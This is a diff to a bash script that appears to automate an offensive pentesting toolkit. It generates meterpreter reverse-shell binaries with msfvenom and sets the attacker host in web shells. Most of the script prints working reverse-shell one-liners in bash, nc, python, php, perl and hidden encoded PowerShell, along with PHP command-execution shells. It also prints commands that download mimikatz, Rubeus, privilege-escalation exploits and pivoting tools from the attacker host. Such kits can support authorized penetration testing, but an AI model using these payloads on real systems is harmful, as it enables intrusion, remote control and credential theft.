@@ -56,8 +56,8 @@ compile_meterpreter() {
     echo -e "${LG}==============================================${W}"
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/mettcp.exe
     msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/win/methttps.exe
+    msfvenom --platform linux --arch x64 --payload linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /home/$USER/auto/payloads/lin/linmettcp.elf
 }
-
 
 set_webshells() {
     echo -e "\n${M}Changing LHOST and LPORT in WebShells${W}"
@@ -70,30 +70,20 @@ set_webshells() {
     echo "pentestmonkey wordpress-plugin zip location -> /home/$USER/auto/payloads/web/wpshell-pm.zip"
     echo "basic ?cmd=[command] wordpress-plugin zip location -> /home/$USER/auto/payloads/web/wpshell-basic.zip"
 
-    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" /home/$USER/auto/payloads/web/shell.aspx # not working rn for some reason
+    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" /home/$USER/auto/payloads/web/shell.aspx
     echo "aspx shell location -> /home/$USER/auto/payloads/web/shell.aspx"
 }
 
-
-# prints the list
 list_stuff() {
-    echo -e "\n\n${BB}WEBAPP${W}"
-    echo -e "${LG}==============================================${W}"
-    echo "<?php echo system(\$_GET['cmd'])?>"
-    echo "<?php%20echo%20system(\$_GET['cmd'])?>"
-    echo "exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\");"
-    echo ""
-    echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22"
-    echo "%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%27%22"
-    echo ""
-    if $1; then
-        echo -n "powershell%20-enc%20"; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
-        echo ""
-    fi
     echo ""
     echo -e "${BB}ONE LINERS${W}"
     echo -e "${LG}==============================================${W}"
+    echo "<?php echo system(\$_GET['cmd'])?>"
+    echo "<?php%20echo%20system(\$_GET['cmd'])?>"
+    echo ""
     echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
+    echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22"
+    echo "%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%27%22"
     echo ""
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
     echo ""
@@ -101,7 +91,7 @@ list_stuff() {
     echo ""
     echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
     echo ""
-    echo "php -r \$sock';echo =fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+    echo "php -r \$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
     echo ""
     echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo ""
@@ -109,6 +99,10 @@ list_stuff() {
     echo ""
     if $1; then
         python3 /home/$USER/auto/scripts/genps_quiet.py $lhost $lport
+        echo ""
+    fi
+    if $1; then
+        echo -n "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand "; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
         echo ""
     fi
     echo ""
@@ -119,11 +113,25 @@ list_stuff() {
     echo -e "iwr -uri http://$lhost/enum/win/SharpHound.exe -OutFile ${G}SharpHound.exe${W}"
     echo -e "iwr -uri http://$lhost/enum/win/SharpHound.ps1 -OutFile ${G}SharpHound.ps1${W}"
     echo ""
-    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsLoggedon.exe -OutFile ${G}PsLoggedon.exe${W}"
-    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsExec.exe -OutFile ${G}PsExec.exe${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsLoggedon64.exe -OutFile ${G}PsLoggedon64.exe${W}"
+    echo -e "iwr -uri http://$lhost/enum/win/PSTools/PsExec64.exe -OutFile ${G}PsExec64.exe${W}"
     echo ""
     echo -e "iwr -uri http://$lhost/payloads/win/Rubeus.exe -OutFile ${G}Rubeus.exe${W}"
     echo -e "iwr -uri http://$lhost/payloads/win/mimikatz.exe -OutFile ${G}mimikatz.exe${W}"
+    echo ""
+    echo ""
+    echo -e "${BB}PIVOTING${W}"
+    echo -e "${LG}==============================================${W}"
+    echo -e "iwr -uri http://$lhost/payloads/win/nmap.exe -OutFile ${G}nmap.exe${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}nmap${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/socat/socat.exe -OutFile ${G}socat.exe${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}socat${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/SharpChisel.exe -OutFile ${G}SharpChisel.exe${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}chisel${W}"
+    echo ""
+    echo -e "iwr -uri http://$lhost/payloads/win/plink.exe -OutFile ${G}plink.exe${W}"
     echo ""
     echo ""
     echo -e "${BB}WINDOWS PRIVILEGE ESCALATION${W}"
@@ -161,25 +169,20 @@ list_stuff() {
     echo -e "wget http://$lhost/enum/lin/${G}pspy64${W}"
     echo ""
     echo -e "wget http://$lhost/payloads/lin/${G}ncat${W}"
+    echo -e "wget http://$lhost/payloads/lin/${G}linmettcp.elf${W}"
     echo ""
     echo -e "wget -r -nH http://$lhost/exploits/lin/${G}exploit_nss${W}/"
     echo -e "wget http://$lhost/exploits/lin/${G}PwnKit${W}"
     echo -e "wget http://$lhost/exploits/lin/${G}pwnkit4034.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}dirty${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}dirty.c${W}"
     echo ""
-    echo -e "wget http://$lhost/exploits/lin/${G}dirtycow.c${W}"
     echo -e "wget http://$lhost/exploits/lin/${G}ebpf_verifier.c${W}"
-    echo -e "wget http://$lhost/exploits/lin/${G}ptrace.c${W}"
     echo -e "wget http://$lhost/exploits/lin/${G}chocobo_root.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}perf_swevent.c${W}"
     echo -e "wget http://$lhost/exploits/lin/${G}polkit3560.sh${W}"
-    echo ""
-    echo ""
-    echo -e "${BB}PIVOTING${W}"
-    echo -e "${LG}==============================================${W}"
-    echo -e "iwr -uri http://$lhost/payloads/win/nmap.exe -OutFile ${G}nmap.exe${W}"
-    echo -e "wget http://$lhost/payloads/lin/${G}nmap${W}"
-    echo ""
-    echo -e "iwr -uri http://$lhost/payloads/win/plink.exe -OutFile ${G}plink.exe${W}"
-    echo -e "wget http://$lhost/payloads/lin/${G}chisel${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}dirtycow.c${W}"
+    echo -e "wget http://$lhost/exploits/lin/${G}ptrace.c${W}"
     echo ""
 }
 
@@ -199,7 +202,6 @@ genshells=false
 start_python=true
 compile_and_dontlist=false
 
-# Parse arguments
 while getopts ":cmdwgsi:p:" opt; do
     case ${opt} in
     c )
@@ -235,8 +237,6 @@ done
 shift $((OPTIND -1))
 
 
-
-# Get interface IP if one was not set manually
 if ! $custom_lhost; then
     get_ip_address
 fi
@@ -265,4 +265,3 @@ else
         start_http_server
     fi
 fi
-
